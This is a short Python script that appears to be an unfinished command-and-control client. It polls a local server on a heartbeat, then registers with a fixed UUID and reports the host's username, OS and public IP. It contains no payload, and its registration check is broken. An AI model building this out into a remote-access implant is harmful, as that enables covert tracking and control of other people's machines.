from logging import exception
import re
from time import sleep
import requests as req
import os
import json

BASE_URL = "http://127.0.0.1:8000"
UUID = "312314143312"
HEART_BEAT = 30

def contactServer():
    try:
        res = req.get(BASE_URL)
    except req.exceptions.ConnectionError:
        return False
    if res.status_code == req.codes.no_content:
        return True
    return False

def registerServer():
    try:
        ip = req.get('https://api.ipify.org').content.decode('utf8')
    except req.exceptions.ConnectionError:
        ip = None

    userName = os.getlogin()
    osName = os.name
    try:
        res = req.post(BASE_URL+"/connect", data=json.dumps({"UUID":UUID, "name":userName, "OS":osName,"IP":ip}))
    except req.exceptions.ConnectionError:
        return False

    if res == req.codes.created or res == req.codes.no_content:
        return True
    else:
        return False


if __name__ == "__main__":

    while(not contactServer()):
        sleep(HEART_BEAT)

    if not registerServer():
        exit()

    